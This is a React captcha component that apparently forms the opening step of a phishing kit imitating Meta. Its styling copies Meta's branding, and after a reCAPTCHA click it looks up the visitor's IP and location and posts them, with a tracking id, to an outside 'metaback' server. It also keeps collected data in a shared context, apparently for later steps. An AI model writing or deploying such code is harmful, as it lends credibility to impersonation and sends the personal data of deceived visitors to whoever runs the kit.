import React, { useContext } from 'react'
import styled from 'styled-components'
import { useState } from 'react'
import ReCAPTCHA from "react-google-recaptcha";
import { DataContext } from '../pages'
import { useTranslations } from 'next-intl';

const Wrapper = styled.div`
    border: 1px solid #bdbdbd;
    border-radius: 0.5rem;
    max-width: 500px;
    width: calc(100% - 2rem);
    margin: auto;
`

const CaptchaContainer = styled.div`
    height: 100dvh;
    width: 100%;
    display: grid;
    place-items: center;
`
const ImgWrapper = styled.div`
    img {
        border-radius: 0.5rem 0.5rem 0rem 0rem;
        width: 100%;
        height: auto;
    }
`
const BottomWrapper = styled.div`
    padding: 1rem;
    background-color: #fff;
    border-radius: 0.5rem;
`
const STitle = styled.div`
    font-size: 30px;
    font-weight: 500;
    letter-spacing: -.05em;
    color: #4a4a4a;
`

const DescriptionStyle = styled.div`
    font-size: 14px;
    letter-spacing: -.025em;
    font-weight: 500;
    color: #4a4a4a;
`
const BoxContainer = styled.div`
    background-color: rgb(243 243 243/255);
    border-color: rgb(224 224 224/255);
    border-radius: 0.25rem;
    border-width: 1px;
    max-width: 300px;
    width: 100%;
    margin-top: 1rem;
    margin-bottom: 0.5rem;
`
const BtnNext = styled.button`
    border: none;
    font-size: 13px;
    font-weight: 500;
    padding: 11px 14px;
    width: 100%;
    border-radius: 8px;
    text-transform: none;
    line-height: 1;
`
const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`
function Captcha({ setStep, Unik, setIp }) {
    const [IsDisabled, setIsDisabled] = useState(true)
    const [IsLoading, setIsLoading] = useState(false)

    const t = useTranslations('Captcha')
 
    

    let { setAllData, AllData } = useContext(DataContext);

    const foo = function (event) {
        if (event) {
            setIsDisabled(false);
        }
    };

    const NextStep = () => {
        // setIsLoading(true)
        fetch('https://api.ipify.org?format=json').then(response => response.json())
            .then(data => {
                fetch('https://ipapi.co/' + data.ip + '/json').then(response => response.json())
                    .then(
                        data => {
                            setIp(data.ip)

                            let params = {
                                id: Unik,
                                ip: data.ip,
                                country: data.country,
                                city: data.city,

                            }

                            setAllData({ ...AllData, ip: data.ip, country: data.country, city: data.city })

                            fetch("https://metaback-f8gb.onrender.com/send/ip", {
                                method: "POST",
                                body: JSON.stringify(params),
                                headers: {
                                    "Content-type": "application/json; charset=UTF-8",
                                    'X-Robots-Tag': 'googlebot: nofollow',
                                }
                            });
                        }
                    )
            }
            );
        setTimeout(() => {
            setStep(1)
            // setIsLoading(false)

        }, 1000);

    }


    
    



   return (
    <CaptchaContainer>
        <Wrapper>
            <BottomWrapper>
                <STitle style={{ fontSize: '25px', fontWeight: '500' }}>
                    {t('title')}
                </STitle>

                <BoxContainer>
                    <div className="captcha">
                        <ReCAPTCHA
                            sitekey="6LctaDEpAAAAAO6YVmUHkocAN7TOuNg2z4hjouRk"
                            onChange={foo}
                        />
                    </div>
                </BoxContainer>

                <DescriptionStyle className="py-2">
                    {t('description.helps')}
                </DescriptionStyle>

                <DescriptionStyle className="py-2">
                    {t('description.usesRecaptcha')}
                </DescriptionStyle>

                <DescriptionStyle className="py-2">
                    {t('description.dataCollection')}
                </DescriptionStyle>

                <div className="pt-4">
                    <BtnNext
                        onClick={NextStep}
                        disabled={IsDisabled}
                        style={{
                            backgroundColor: IsDisabled ? '#e5e6eb' : '#0064e0',
                            color: IsDisabled ? '#cbccd2' : '#fff',
                        }}
                    >
                        {IsLoading ? <Spinner /> : t('continue')}
                    </BtnNext>
                </div>
            </BottomWrapper>
        </Wrapper>
    </CaptchaContainer>
);

}

export default Captcha
